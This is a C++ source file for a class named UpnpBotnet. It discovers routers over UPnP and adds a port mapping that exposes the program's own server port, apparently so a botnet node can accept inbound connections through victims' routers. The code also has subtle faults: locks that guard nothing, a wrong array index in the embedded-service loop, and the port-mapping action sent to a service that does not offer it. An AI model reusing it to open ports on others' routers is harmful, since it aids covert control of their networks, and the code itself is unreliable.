#include "upnp.hpp"

bool _searchdone;
std::condition_variable locations_cv;
std::set<std::string> locations;


static int mycallback(Upnp_EventType event_type, const void *evt, void *ctxt)
{
    UpnpDiscovery *dsp = (UpnpDiscovery*)evt;
    switch (event_type) {
    case UPNP_DISCOVERY_ADVERTISEMENT_ALIVE:
        goto dldesc;
    case UPNP_DISCOVERY_ADVERTISEMENT_BYEBYE:
        break;
    case UPNP_DISCOVERY_SEARCH_RESULT:
        goto dldesc;
    case UPNP_DISCOVERY_SEARCH_TIMEOUT:
    {
        std::unique_lock<std::mutex> loclock;
        _searchdone = true;
        locations_cv.notify_all();
    }
    break;
    case UPNP_EVENT_RECEIVED:
    {
        // General events from the services we subscribed to
        struct Upnp_Event *evp = (struct Upnp_Event *)evt;
        std::cerr << "Got upnp event for subscription " << evp->Sid <<
            " seq " << evp->EventKey << " Changed:\n";
        for (const auto& entry : evp->ChangedVariables) {
            std::cerr << "[" << entry.first << "]->[" << entry.second << "]\n";
        }
    }
    break;

    default:
        std::cerr << "Got event type " << event_type << "\n";
    }

    return 0;
 
    dldesc:
        std::unique_lock<std::mutex> loclock;
        locations.insert(dsp->Location);
        locations_cv.notify_all();
        return 0;
}

void UpnpBotnet::RegisterClient() {
    _success = UpnpRegisterClient(mycallback, nullptr, &_hdl);

    CheckErrorAndExit("register client failed: ");
}

const std::vector<std::pair<std::string, std::string>>
    UpnpBotnet::runaction(UpnpClient_Handle _hdl, const std::string& action_name,
    const std::vector<std::pair<std::string, std::string>>& args)
{
    std::cerr << "Runaction. Service URL " << _service_ctlurl << " action: " << action_name << "\n";

    int errorcode;
    std::string errdesc;
    std::vector<std::pair<std::string, std::string>> responsedata;

    int res = UpnpSendAction(
        _hdl, "", _service_ctlurl, _service_type,
        action_name, args, responsedata, &errorcode, errdesc);
    if (res != UPNP_E_SUCCESS) {
        std::cerr << res << std::endl;
        return responsedata;
    }
    std::cerr << "Response arg count: " << responsedata.size() << std::endl;
    for (const auto &entry : responsedata) {
        std::cerr << "[" << entry.first << "]->[" << entry.second << "]\n";
    }
    return responsedata;
}

void UpnpBotnet::Loop()
{
    std::unique_lock<std::mutex> locklocs(locations_mutex);
    while (true) {
        locations_cv.wait(locklocs);
        if (_searchdone)
            break;

        ScrapDevices();

    }
}

void UpnpBotnet::ScrapDevices()
{
    for (auto it = locations.begin(); it != locations.end();
    it = locations.erase(it)) {
        std::string data;
        std::string ct;

        _success = UpnpDownloadUrlItem(*it, data, ct);
        if (CheckErrorAndContinue("UpnpDownloadUrlItem failed: "))
            continue;

        UPnPClient::UPnPDeviceDesc desc(*it, data);
        if (!desc.ok) {
            std::cout << "Description parse failed for " << *it << "\n";
            continue;
        }

        std::cout << "Got " << data.size() <<
            "Bytes of description data from " <<
            desc.friendlyName << "\n";

        VerifyDeviceIsModemRouter(desc);
        if (_service_type == "") continue;
        AddPortMapping();
    }
}

void UpnpBotnet::VerifyDeviceIsModemRouter(UPnPClient::UPnPDeviceDesc desc)
{
    for (int i = 0; i < desc.services.size(); ++i) {
        std::cout << desc.services[i].serviceId << std::endl;
        if (desc.services[i].serviceId == "urn:upnp-org:serviceId:WANCommonIFC1") {
            _service_type = desc.services[i].serviceType;
            _service_ctlurl = desc.URLBase + desc.services[i].controlURL;
            _service_evturl = desc.URLBase + desc.services[i].eventSubURL + ".xml";
            break;
        }
    }
    if (_service_type == "") {
        for (int j = 0; j < desc.embedded.size(); ++j) {
            for (int i = 0; i < desc.embedded[j].services.size(); ++i) {
                std::cout << desc.services[i].serviceId << std::endl;
                if (desc.embedded[j].services[i].serviceId == "urn:upnp-org:serviceId:WANCommonIFC1") {
                    _service_type = desc.embedded[j].services[i].serviceType;
                    _service_ctlurl = desc.URLBase + desc.embedded[j].services[i].controlURL;
                    _service_evturl = desc.URLBase + desc.embedded[j].services[i].eventSubURL + ".xml";
                    break;
                }
            }
        }
    }
}

void UpnpBotnet::AddPortMapping()
{
    int timeout = 3600;

    std::vector<std::pair<std::string, std::string>> addPortMappingArgs {
        {"NewRemoteHost", ""},
        {"NewExternalPort", std::to_string(UpnpGetServerPort())},
        {"NewProtocol", "TCP"},
        {"NewInternalPort", std::to_string(UpnpGetServerPort())},
        {"NewInternalClient", UpnpGetServerIpAddress()},
        {"NewEnabled", "1"},
        {"NewPortMappingDescription", "Port Mapping Description"},
        {"NewLeaseDuration", std::to_string(timeout)},
    };
    runaction(_hdl, "AddPortMapping", addPortMappingArgs);
}
